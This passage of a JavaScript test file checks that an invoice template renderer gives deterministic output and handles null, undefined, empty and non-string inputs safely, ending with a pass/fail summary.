const renderPure1 = renderInvoiceTemplate(immutableTemplate, immutableData);
const renderPure2 = renderInvoiceTemplate(immutableTemplate, immutableData);
assert(renderPure1 === '<h1>INV-IMMUTABLE</h1>', 'Renders frozen data correctly');
assert(renderPure1 === renderPure2, 'Repeated rendering produces deterministic output');

// Edge case: null, undefined, empty template string
assert(renderInvoiceTemplate(null, {}) === '', 'null template returns empty string');
assert(renderInvoiceTemplate(undefined, {}) === '', 'undefined template returns empty string');
assert(renderInvoiceTemplate('', {}) === '', 'empty template string returns empty string');
assert(renderInvoiceTemplate(12345, {}) === '', 'non-string template returns empty string');

// Edge case: null or undefined invoiceData
const fallbackDataResult = renderInvoiceTemplate('<h1>{{invoiceNumber}}</h1>', null);
assert(fallbackDataResult === '<h1></h1>', 'null invoiceData resolves tokens to empty strings gracefully');

console.log(`\nTests Completed: ${passed} Passed, ${failed} Failed`);
if (failed > 0) process.exit(1);
